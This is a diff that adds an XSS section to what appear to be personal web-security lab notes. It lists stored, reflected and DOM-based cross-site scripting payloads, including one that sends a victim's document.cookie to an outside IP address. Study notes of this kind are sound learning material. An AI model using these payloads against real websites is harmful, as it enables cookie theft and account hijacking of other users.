@@ -53,3 +53,40 @@ or change something
   <lastName>&food;</lastName>
  </foodInfo>
  ```
+ 
+ ### XSS (Cross-Site Scripting)
+ 
+ Injection where an attacker can execute malicious scripts and execute on machine
+ 
+ #### Stored-XSS
+ 
+ See if we can add html tags
+ 
+ <b>comment</b>
+ 
+ See if we can get a popup
+ ```
+ <script>alert(XSS popup)</script>
+ ```
+ We can even get cookies or change element with javascript
+ 
+ ```
+ <script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>
+ <script>alert(document.cookie)</script>
+ ```
+ We can also steal cookies from other users.
+ 
+ ```
+ <script>window.location='http://192.168.1.10/?cookie='+document.cookie</script>
+ ```
+ 
+ ####  Reflected XSS
+ ```
+ <script>alert("hello")</script>
+ <script>alert(window.location.hostname)</script>
+ ```
+ #### DOM-Based XSS
+ ```
+ test" onmouseover="alert('test')
+ test" onmouseover="document.body.style.backgroundColor='red'
+ ```
